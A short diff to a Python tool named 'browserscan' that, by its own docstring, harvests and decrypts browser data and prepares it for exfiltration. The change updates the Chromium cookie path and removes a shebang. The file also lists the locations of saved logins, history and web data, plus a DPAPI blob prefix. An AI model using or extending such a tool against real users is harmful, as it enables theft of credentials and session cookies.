@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 
 """browserscan  Scans for browser data, decrypts, and prepares it for exfil.
 Copyright (C) 2020  Alertra, Inc.
@@ -44,7 +43,7 @@ class ChromiumScanner:
     DPAPI_PREFIX = b"\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB"
 
     LOGIN_DATA_NAME = "Default\\Login Data"
-    COOKIES = "Default\\Cookies"
+    COOKIES = "Default\\Network\\Cookies"
     HISTORY = "Default\\History"
     BOOKMARKS = "Default\\Bookmarks"
     WEBDATA = "Default\\Web Data"
